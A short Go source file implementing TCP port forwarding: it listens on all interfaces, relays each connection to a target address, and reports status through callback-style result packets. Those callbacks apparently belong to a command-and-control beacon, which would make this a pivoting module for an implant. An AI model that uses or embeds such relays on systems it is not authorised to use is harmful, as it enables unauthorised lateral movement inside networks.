package command

import (
	"errors"
	"io"
	"main/packet"
	"main/util"
	"net"
	"sync"
)

var listenerMap sync.Map

func join(src io.ReadWriteCloser, dst io.ReadWriteCloser) {
	var wait sync.WaitGroup
	pipe := func(to io.ReadWriteCloser, from io.ReadWriteCloser) {
		defer to.Close()
		defer from.Close()
		buf := make([]byte, 1024)
		defer wait.Done()
		_, err := io.CopyBuffer(to, from, buf)
		if err != nil {
			if !errors.Is(err, net.ErrClosed) {
				packet.ErrorMessage(err.Error())
			}
			return
		}
	}
	wait.Add(2)
	go pipe(src, dst)
	go pipe(dst, src)
	wait.Wait()
}

func portForwardServe(port string, target string) error {
	listen, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		return err
	}
	packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("Listening on 0.0.0.0: %s, forward to %s", port, target)))
	listenerMap.Store(port, &listen)
	go func() {
		for {
			srcConn, err := listen.Accept()
			if err != nil {
				if !errors.Is(err, net.ErrClosed) {
					packet.ErrorMessage(err.Error())
				}
				return
			}
			dstConn, err := net.Dial("tcp", target)
			if err != nil {
				packet.ErrorMessage(err.Error())
				return
			}
			go join(srcConn, dstConn)
		}
	}()
	return nil
}

func portForwardStop(port string) error {
	if value, ok := listenerMap.LoadAndDelete(port); ok {
		if listener, ok := value.(*net.Listener); ok {
			_ = (*listener).Close()
			packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("stop portforward at %s success", port)))
			return nil
		}
	}
	return errors.New(util.Sprintf("no portforward on %s", port))
}
